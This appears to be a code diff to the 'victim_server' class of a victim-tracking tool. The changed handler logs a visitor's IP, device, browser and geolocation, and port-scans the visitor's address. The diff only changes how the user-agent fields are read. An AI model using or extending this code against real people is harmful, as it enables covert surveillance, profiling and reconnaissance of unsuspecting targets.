@@ -75,7 +75,11 @@ class victim_server(object):
         if vId == '':
           vId = utils.generateToken(5)
         
-        victimConnect = victim(vId, request.environ['REMOTE_ADDR'], request.user_agent.platform, request.user_agent.browser, request.user_agent.version,  utils.portScanner(request.environ['REMOTE_ADDR']), request.form['cpu'], time.strftime("%Y-%m-%d - %H:%M:%S"))
+        ua_browser = request.form.get('ua_browser', 'Unknown')
+        ua_version = request.form.get('ua_browser_version', '')
+        ua_os = request.form.get('ua_os', 'Unknown')
+        ua_device = request.form.get('ua_device', 'desktop')
+        victimConnect = victim(vId, request.environ['REMOTE_ADDR'], ua_device, ua_browser, ua_version, utils.portScanner(request.environ['REMOTE_ADDR']), request.form['cpu'], time.strftime("%Y-%m-%d - %H:%M:%S"))
         victimGeo = victim_geo(vId, request.form['city'], request.form['country_code2'], request.form['country_name'], request.form['ip'], request.form['latitude'], request.form['longitude'], request.form['isp'], request.form['country_code3'], request.form['state_prov'], '', request.form['zipcode'], request.form['organization'], str(request.user_agent), '')
         
         vRA = request.environ['REMOTE_ADDR']
